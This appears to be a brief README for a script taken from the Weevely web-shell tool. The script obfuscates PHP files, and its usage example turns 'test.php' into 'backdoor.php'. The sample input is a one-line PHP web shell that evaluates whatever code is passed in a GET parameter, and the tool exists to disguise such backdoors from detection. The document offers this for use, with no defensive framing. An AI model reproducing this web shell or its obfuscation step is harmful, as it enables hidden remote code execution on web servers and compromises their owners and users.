weevely-encryption
===

weevely-encryption is extracted in weevely(https://github.com/epinna/Weevely)

### Help Menu
    Usage: weevely-encryption.py input_filename.php output_filename.php

### Example
    ./weevely-encryption.py test.php backdoor.php

####test.php
    <?php eval($_GET['a']);?>
